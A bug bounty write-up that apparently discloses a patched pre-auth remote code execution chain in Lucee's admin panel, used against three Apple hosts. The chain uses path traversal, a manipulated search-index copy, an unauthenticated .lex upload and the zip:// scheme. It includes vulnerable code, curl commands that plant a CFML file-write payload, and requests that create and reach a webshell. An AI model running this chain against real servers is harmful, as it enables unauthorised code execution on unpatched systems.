# Finding 0day to hack Apple

### Getting started
We started hacking on Apple after the [infamous blog](https://samcurry.net/hacking-apple/) by Sam, et al. The goal was to focus on critical findings such as PII exposure or getting access to Apple's servers/internal network. These are the types of bugs we thought Apple would be more interested in.

### Reconnaissance and fingerprinting

While going through our recon data and fingerprinting what services might be running, we found three hosts running on a CMS which was backed by [Lucee](https://github.com/lucee/Lucee/). 

As both the CMS and Lucee were easily available to host locally, they were both good targets for us to hack on. We opted to focus on Lucee as it exposed an admin panel and had history of vulnerabilities. Lucee is forked on Railo-context, Which was briefly discussed in [Breaking Parser Logic](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) by [Orange Tsai](https://twitter.com/orange_8361).

Lucee's admin panel was accessible on three different hosts on Apple. Two was running on outdated version and the other one was running a fairly recent version.

- https://facilities.apple.com/ (Recent version)
- https://booktravel.apple.com/ (Older version)
- https://booktravel-uat.apple.com/ (Older version)

### Apple's WAF Behaviour

To exploit the vulnerabilities that we'll discuss below we need to understand the WAF in place by Apple, more importantly, how Apple front end server at facilities.apple.com responds. 

Apple has a very painful WAF it blocks almost any attempt for Path-traversal/SQLi via URL (query params). 

The frontend server (reverse proxy) at facilities.apple.com is configured to only show responses for 200 and 404 status code from the backend server. So If you get any other status code on the backend, the frontend server will serve a 403, which is the same response when the WAF Is triggered.

### Lucee Misconfiguration

While testing out Lucee locally we came across a critical misconfiguration allowing an attacker to access authenticated CFM (ColdFusion) files directly. This allows us to perform alot of authenticated actions while being completely unauthenticated. 

Within the CFM files, as soon as you hit the `request.admintype` variable/propery the execution flow will stop as we're not authenticated as admin however any code before reaching that check would execute. So we had to find files which has some sort of bug before we hit `request.admintype`.

We'll make use of these three files to gain a complete pre-auth/unauth RCE on Lucee installation.

- imgProcess.cfm (not available in older versions)
- admin.search.index.cfm
- ext.applications.upload.cfm

## Failed attempt

### Sweet & Simple RCE in imgProcess.cfm 

To replicate Apple's installation we got a local copy of Lucee running with the same version. Opening the file without any parameter gave us exception on our installation and while opening the file on Apple gave us 403 which means that file exists, we need to specify the right parameter/values otherwise the backend server will have an exception for which the frontend server will serve a 403.

Giving wrong parameters - 

![403 Because of exception on backend](screenshots/Screenshot_59.png)

Giving right parameters 

![200 Because of exception on backend](screenshots/Screenshot_58.png)


This file had a path traversal vulnerability to create a file anywhere on the server with our given content. 

```cfm
<cfoutput>
	<cffile action="write" 
	file="#expandPath('{temp-directory}/admin-ext-thumbnails/')#\__#url.file#"
	Output="#form.imgSrc#" 
	createPath="true">
</cfoutput> 
```

This will take a query parameter `file` and create it this way `{temp-directory}/admin-ext-thumbnails/__{our-input}`, our input can be defined via post parameter `imgSrc`. 

You should already see it, to do a path traversal we need a directory `__` to exist as Linux requires a path to exist before doing a traversal. But, luckily for us, `expandPath` creates the path if it doesn't exist and returns the path as string. So passing file=/../../../context/pwn.cfm will create the directory `__` and traverse to the context directory within webroot thus giving us an ezz RCE here.

However, Even when the bug is legit, ***we can't exploit this in case of Apple because of WAF*** blocking the `../` in query parameter and this endpoint especially asks the `file` parameter to be a query parameter (`url.file` & `form.imgSrc`). If both were form/post parameter we won't trigger WAF. **We could still use this endpoint to create files with our controlled name and content in a certain directory without triggering WAF.**  

## What now? Something that won't trigger WAF?

### Tricky copy

`admin.search.index.cfm` allows us to specify a directory and copy its contents to our desired location. However, **the copy function is very tricky and won't actually copy the file contents, nor will it preserve the file extension.**

This endpoint takes two parameter 

- dataDir
- luceeArchiveZipPath

`dataDir` is the path where you want to copy the files speicified via the `luceeArchiveZipPath` parameter. If the path doesn't exist it will be created. We can pass absolute path here.

```cfm
<cfif not directoryExists(dataDir)>
		<cfdirectory action="create" directory="#dataDir#" mode="777" recurse="true" />
</cfif>
 ```
 
Example request;

```http
GET /lucee/admin/admin.search.index.cfm?dataDir=/copy/to/path/here/&LUCEEARCHIVEZIPPATH=/copy/from/path/here HTTP/1.1
Host: facilities.apple.com
User-Agent: Mozilla/5.0 
Connection: close
```

Now that we know the copy function is not your usual copy, so let's have a deeper dive into the code responsible for doing this.

We notice this interesting CFML tag,

```cfm
<cfdirectory action="list" directory="#luceeArchiveZipPath#" filter="*.*.cfm" name="qFiles" sort="name" />
```

It tries to interact with the dir/files inside the directory path which is held in **luceeArchiveZipPath** variable and ***there is a filter attribute which says that, only list files which are of format \*.\*.cfm*** and finally, this result of query is stored in the variable **"qFiles"**. 

Next, It iterates over each file (which it stores in the variable **currFile**) and replaces **'.cfm'** occurance in the file's name to a blank string '' and stores this updated filename in a variable **currAction**. Such that if we have a file `test.xyz.cfm` it would now become `test.xyz`. 

```cfm
<cfset currAction = replace(qFiles.name, '.cfm', '') />
```

Afterwards, it checks if a file something like 'test.xyz.en.txt' or 'test.xyz.de.txt' exists in the directory referenced by variable **datadir** which is again user controlled and if not then it would replace  dots ('.') in the filename with a whitespace and save it into **pageContents.lng.currAction** variable, Later on, the file test.xyz.\<lang\>.txt is created and the value of **pageContents.lng.currAction** variable becomes its contents.

```cfm
<cfif fileExists('#datadir##curraction#.#lng#.txt')>
<cfset pageContents[lng][currAction] = fileRead('#datadir##curraction#.#lng#.txt', 'utf-8') />
<cfelse>
<!--- make sure we will also find this page when searching for the file name--->
<cfset pageContents[lng][currAction] = "#replace(curraction, '.', ' ')# " />
</cfif>
```

Unfortunately, for us it creates .txt file even though we can control over the contents of the file as it comes from the filename itself. But we will see how we utilized the file name itself to do stuff ;) as we move further.

Following the execution, it then stores the content of the **currfile** in **data** variable and filters ***only the files whose content matches the following Regular Expression*** string `[''"##]stText\..+?[''"##]` and put them into the array **finds**

```cfm
<cfset data = fileread(currfile) />
<cfset finds = rematchNoCase('[''"##]stText\..+?[''"##]', data) />
```

Then loops over the **finds** array and it looks if each item in the **finds** array exists as a key and simply put, if the key doesn't exist, it will create one and store it in the variable **searchresults**.

```cfm
<cfloop array="#finds#" index="str">
	<cfset str = rereplace(listRest(str, '.'), '.$', '') />
		[..snip..]
		<cfif structKeyExists(translations.en, str)>
			<cfif not structKeyExists(searchresults[str], currAction)>
				<cfset searchresults[str][currAction] = 1 />
			<cfelse>
				<cfset searchresults[str][currAction]++ />
			</cfif>
		</cfif>
</cfloop>
```

Finally, these contents of keys (i.e. **searchresults** variable) are stored in a file named 'searchindex.cfm' inside directory path present in **datadir** variable as JSON.

```cfm
<cffile action="write" file="#datadir#searchindex.cfm" charset="utf-8" output="#serialize(searchresults)#" mode="644" />
```

## Remote Code Execution on facilities.apple.com

If you haven't figured out already, At this point we have a sweet RCE on https://facilities.apple.com by chaining `imgProces.cfm` and `admin.search.index.cfm`

We have control over directory where we can copy files to (**dataDir** parameter) and **luceeArchiveZipPath** parameter in which we can specify directory where to query files from.

Now If we could create a file named `server.<cffile action=write file=#Url['f']# output=#Url['content']#>.cfm` which is of format \*.\*.cfm with content `"#stText.x.f#"` anywhere on the server and pass its path via  **luceeArchiveZipPath**, Since this key `server.<cffile action=write file=#Url['f']# output=#Url['content']#>.cfm` would not exist, it will create this very key and it is written into the file **searchindex.cfm** and now that it has our controlled CFML tags (think it similar to PHP Tags) and it is being written to our controlled path passed via **dataDir**, we can pass webroot path thus giving us server side code execution!

We would utilize `imgProcess.cfm` to create a file `server.<cffile action=write file=#Url['f']# output=#Url['content']#>.cfm` on the target's filesystem with contents that matches the RegExp `[''"##]stText\..+?[''"##]`. 

This attempt won't trigger WAF because we're not doing path traversal here.

### Steps to get shell

- Create file  `server.<cffile action=write file=#Url['f']# output=#Url['content']#>.cfm` with content `"#stText.x.f#"` (to match regex), We'll URL encode filename because backend tomcat won't like certain characters.

`curl -X POST 'https://facilities.apple.com/lucee/admin/imgProcess.cfm?file=%2F%73%65%72%76%65%72%2e%3c%63%66%66%69%6c%65%20%61%63%74%69%6f%6e%3d%77%72%69%74%65%20%66%69%6c%65%3d%23%55%72%6c%5b%27%66%27%5d%23%20%6f%75%74%70%75%74%3d%23%55%72%6c%5b%27%63%6f%6e%74%65%6e%74%27%5d%23%3e%2e%63%66%6d'  --data 'imgSrc="#stText.Buttons.save#"'`

- Get code execution 

`curl 'http://facilities.apple.com/lucee/admin/admin.search.index.cfm?dataDir=/full/path/lucee/context/rootxharsh/&LUCEEARCHIVEZIPPATH=/full/path/lucee/temp/admin-ext-thumbnails/__/'`

- Write Shell 

`curl https://facilities.apple.com/lucee/rootxharsh/searchindex.cfm?f=PoC.cfm&content=cfm_shell`

- Access webshell - https://facilities.apple.com/lucee/rootxharsh/PoC.cfm

![PoC](screenshots/poc.png)

## But, what about other hosts?

Because `imgProcess.cfm` not being available in older versions we had to find some other way to get RCE on the other two hosts. We came across another neat way ;).

### Unauthenticated .lex file upload

`ext.applications.upload.cfm` is partially unauth, The code snippet is fairly simple, We're required to pass `extfile` form file parameter with filename's extention set to `.lex` otherwise we'd get an exception. 

```cfm
<cfif not structKeyExists(form, "extfile") or form.extfile eq "">
	...
</cfif>
<!--- try to upload (.zip and .re) --->
<cftry>
	<cffile action="upload" filefield="extfile" destination="#GetTempDirectory()#" nameconflict="makeunique" />
	<cfif cffile.serverfileext neq "lex">
		<cfthrow message="Only .lex is allowed as extension!" />
	</cfif>
	<cfcatch>
		...
	</cfcatch>
</cftry>

<cfset zipfile = "#rereplace(cffile.serverdirectory, '[/\\]$', '')##server.separator.file##cffile.serverfile#" />
```

When we have the extension, `.lex` we go through this piece of code. 

```cfm
<cfif cffile.serverfileext eq "lex">
...
        type="#request.adminType#"
...
</cfif>
```

Because we don't have `request.admintype` set this will cause an exception, however our file is still uploaded before reaching this. As can be confirmed here. 

![File created regardless of exception](screenshots/Screenshot_63.png)

A `.lex` file is actually nothing but an archive or a zip file with '.lex' extension which is actually a format of Lucee's extensions which we could upload. Also, there's no check on the contents, so we can set it to anything.

### Gist of the Exploit

From playing around Lucee, we knew that it allows using protocol/schemes like zip://, file:// etc. (which we utilized in this exploit chain) so we could specify these schemes wherever a FileSystem function had our fully controlled input (**luceeArchiveZipPath** in this case).

We would now utilize `ext.applications.upload.cfm` to create `.lex` file which will have a ZIP archive that will consist of file `server.<cffile action=write file=#Url['f']# output=#Url['content']#>.cfm` and the file content will be `"#stText.x.f#"`.

Once we have our ZIP archive on the filesystem. We would utilize **zip://** in **luceeArchiveZipPath** to query within the ZIP archive for the **\*.\*.cfm** files ;).


### Getting shell on other 2 hosts

- Created a file `server.<cffile action=write file=#Url['f']# output=#Url['content']#>.cfm` with content `"#stText.x.f#"` and zip it as `payload.lex`

![payload](screenshots/Screenshot_64.png)

- Uploaded `.lex` via earlier found unauthenticated .lex file upload in `ext.applications.upload.cfm` 

`curl -vv -F extfile=@payload.lex https://booktravel.apple.com/lucee/admin/ext.applications.upload.cfm`

- Equipped with arbitrary `.lex` (zip archive) creation on the file system and zip:// scheme we could do something like this

`curl https://booktravel.apple.com/lucee/admin/admin.search.index.cfm?dataDir=/full/path/lucee/web/context/exploit/&luceeArchiveZipPath=zip:///full/path/lucee/web/temp/payload.lex`

- Now, our file with name `server.<cffile action=write file=#Url['f']# output=#Url['content']#>.cfm` would be added as a text in the **searchindex.cfm** file under `/<lucee web>/context/exploit/` and we could access it via `https://booktravel.apple.com/<lucee root>/exploit/searchindex.cfm`

- Making a request to https://booktravel.apple.com/lucee/exploit/searchindex.cfm?f=test.cfm&output=cfml_shell will create our webshell

- Webshell : https://booktravel.apple.com/lucee/exploit/test.cfm?cmd=id

![PoC 2](screenshots/poc-2.png)

**There were load balancers in place so we had to use intruder to find our shell lol**

## Conclusion

Apple prompty fixed the issue but requested us to not disclose the issue before they make some other changes. Apple rewarded us with a total of $50,000 bounty for these issues. 

On the other hand we and Apple were also talking with Lucee, Lucee team has also fixed the bug by restricting access to cfm files directly, here's the [commit link](https://github.com/lucee/Lucee/commit/6208ab7c44c61d26c79e0b0af10382899f57e1ca). We're still awaiting on CVE allocation tho.

If you have any questions, ping us at [@rootxharsh](https://twitter.com/rootxharsh) & [@iamnoooob](https://twitter.com/iamnoooob). 

Thanks for reading, Have a great year ahead!
